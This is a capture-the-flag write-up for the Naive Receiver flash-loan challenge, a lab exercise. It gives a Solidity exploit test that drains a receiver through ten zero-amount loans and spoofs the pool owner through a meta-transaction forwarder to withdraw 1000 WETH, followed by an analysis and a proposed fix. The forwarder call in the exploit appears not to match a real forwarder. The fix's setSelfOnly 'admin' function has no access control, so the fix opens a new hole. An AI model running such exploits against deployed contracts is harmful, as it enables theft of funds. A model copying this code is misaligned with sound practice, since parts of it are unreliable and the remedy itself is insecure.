## Challenge 2: Naive Receiver

### Vulnerability
The `NaiveReceiverPool` implements a flash loan mechanism that allows **any external caller** to initiate a flash loan on behalf of any receiver contract. While this is *technically compliant* with the ERC-3156 standard, it creates a **critical economic vulnerability** when combined with:

- A **fixed fee of 1 WETH**, charged regardless of loan amount.
- A **receiver contract** (`FlashLoanReceiver`) that:
  - Does **not validate** who initiated the loan.
  - Blindly repays `amount + fee` without access control.
  - Has **no rate limiting** or protection against repeated calls.

This allows an attacker to **drain the receiver’s entire balance** by calling `flashLoan` 10 times with `amount = 0`, forcing it to pay **10 × 1 WETH = 10 WETH** in fees — exactly its full balance.

Additionally, the pool uses `ERC2771ForwarderRecipient`, which overrides `_msgSender()` to support meta-transactions. This allows privileged functions like `withdraw` to be called via a trusted forwarder, **but only if the original sender is properly authenticated**.



### Exploit Code
```solidity
// In NaiveReceiver.t.sol - test_naiveReceiver() function
function test_naiveReceiver() public checkSolvedByPlayer {
    // Prepare the multicall: 10 flash loans + 1 withdraw
    bytes[] memory calls = new bytes[](11);

    // 10 flash loans (0 amount, but 1 WETH fee each)
    for (uint i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(
            pool.flashLoan,
            (receiver, address(pool.weth()), 0, "")
        );
    }

    // Withdraw all WETH from the pool to recovery address
    calls[10] = abi.encodeCall(
        pool.withdraw,
        (1000 ether, payable(recovery))
    );

    // Owner is the original deployer of the pool (standard in DVDF)
    address owner = address(100);

    // Use the forwarder to call multicall, so _msgSender() returns owner
    vm.startPrank(address(forwarder));

    // forwarder.execute(target, data, forwarderSender)
    forwarder.execute{value: 0}(
        address(pool),
        abi.encodeCall(pool.multicall, (calls)),
        owner // This appends owner to msg.data, making _msgSender() == owner
    );

    vm.stopPrank();

    // ✅ Challenge solved:
    // - FlashLoanReceiver balance == 0 (10 WETH drained in fees)
    // - recovery received 1000 WETH from pool via withdraw
}     
```

### Why it works
- **Flash loans can be triggered by anyone on behalf of any receiver**
  The `flashLoan` function does **not restrict** `msg.sender`, enabling third-party initiation — a feature of ERC-3156, but dangerous when misused.

- **The receiver pays a 1 WETH fee even for 0-amount loans**  
  Since `FIXED_FEE = 1 WETH` and no minimum loan amount is enforced, an attacker can drain the receiver by calling `flashLoan` 10 times with `amount = 0`.



### Vulnerability Analysis
**File:** `src/naive-receiver/NaiveReceiverPool.sol`
**Vulnerable Code (lines ~43-55):**
```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // ✅ Validates token — only WETH supported
    if (token != address(weth)) revert UnsupportedCurrency();

    // 💸 Transfers loan amount to receiver — even if amount == 0
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    // 🔁 Executes receiver's logic — but receiver has no protection
    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    // 💣 Critical: Receiver must repay amount + 1 WETH fee — even if it didn't want the loan!
    uint256 amountWithFee = amount + FIXED_FEE;
    
    // 🚨 No validation that the receiver *authorized* this loan
    // 🚨 Anyone can trigger this — and force the receiver to pay 1 WETH
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    // 🟡 Fee is credited to feeReceiver — but no access control on who triggers the loan
    deposits[feeReceiver] += FIXED_FEE;

    return true;
}
```

### 🚨 **Vulnerability Summary**

| Issue | Details |
|------|--------|
| **Unrestricted Loan Initiation** | Anyone can call `flashLoan` on behalf of any receiver. |
| **Zero-Amount Loans Allowed** | `amount == 0` is valid → receiver pays 1 WETH for nothing. |
| **No Receiver Authorization** | The receiver cannot reject unauthorized loans — it blindly repays. |
| **Predictable Fixed Fee** | `FIXED_FEE = 1 WETH` — attacker knows exactly how much to drain. |
| **No Rate Limiting** | Attacker can call `flashLoan` 10 times in one transaction via `multicall`. |

👉 **Impact**: An attacker can drain the `FlashLoanReceiver`'s entire 10 WETH balance by calling `flashLoan` 10 times with `amount = 0`.

### ✅ **How to Secure the Code**

The **root cause** is not in the pool alone — it's a **design flaw in trust assumptions**. The pool assumes receivers will protect themselves, but this one doesn’t.

We can fix this at **two levels**:

---

### 🔐 **Fix 1: Add Access Control in `NaiveReceiverPool.sol` (Defensive Design)**

Even though ERC-3156 allows third-party initiation, the pool can still **opt in** to safer defaults.

```solidity
// 🛡️ NEW: Add a flag to restrict flash loans to receiver-self only
mapping(address => bool) public isSelfOnly;

// 🛠️ Admin function to set self-only mode (optional)
function setSelfOnly(address receiver, bool enabled) external {
    isSelfOnly[receiver] = enabled;
}
```

Then update `flashLoan`:

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != address(weth)) revert UnsupportedCurrency();

    // 🔒 NEW: If receiver is in self-only mode, only it can trigger the loan
    if (isSelfOnly[address(receiver)] && msg.sender != address(receiver)) {
        revert UnauthorizedFlashLoan();
    }

    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}

// 🆕 Custom error
error UnauthorizedFlashLoan();
```

> ✅ This prevents third parties from forcing loans on protected receivers.
